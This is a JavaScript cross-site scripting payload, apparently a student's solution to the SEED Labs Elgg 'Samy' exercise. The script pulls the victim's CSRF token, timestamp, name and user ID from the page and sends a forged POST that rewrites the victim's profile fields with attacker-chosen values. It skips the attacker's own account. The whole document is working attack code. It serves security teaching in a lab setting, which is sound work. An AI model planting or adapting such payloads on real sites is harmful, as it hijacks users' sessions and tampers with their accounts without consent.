<script type="text/javascript">
    window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var name="&name="+elgg.session.user.name;
    // Generally, access levels could represent different levels of visibility or permissions, such as:
    // 0: Public (accessible to anyone)
    // 1: Logged-in users only
    // 2: Friends only
    // 3: Private (accessible only to the user)
    var description="&description=1905052"+"&accesslevel[description]=1";
    var briefdescription="&briefdescription=Bijoy Ahmed Saiem"+"&accesslevel[briefdescription]=1";
    var location="&location=Quasba"+"&accesslevel[location]=1";
    var interests="&interests=Fishing"+"&accesslevel[interests]=1";
    var skills="&skills=Nothing"+"&accesslevel[skills]=1";
    var contactemail="&contactemail=bijoy@gmail.com"+"&accesslevel[contactemail]=1";
    var phone="&phone=0123456789"+"&accesslevel[phone]=1";
    var mobile="&mobile=01323456789"+"&accesslevel[mobile]=1";
    var website="&website=http://www.example.com/index.html"+"&accesslevel[website]=1";
    var twitter="&twitter=bijoy"+"&accesslevel[twitter]=1";
    var guid="&guid="+elgg.session.user.guid;


    //Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
    var content=token+ts+name+description+briefdescription+location+interests+skills+contactemail+phone+mobile+website+twitter+guid; //FILL IN
    var samyId=59;
    if(elgg.session.user.guid!=samyId)
    {
            //Create and send Ajax request to modify profile
            var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Host","www.seed-server.com");
    Ajax.setRequestHeader("Content-Type",
    "application/x-www-form-urlencoded");
    Ajax.send(content);
        }
	}
</script>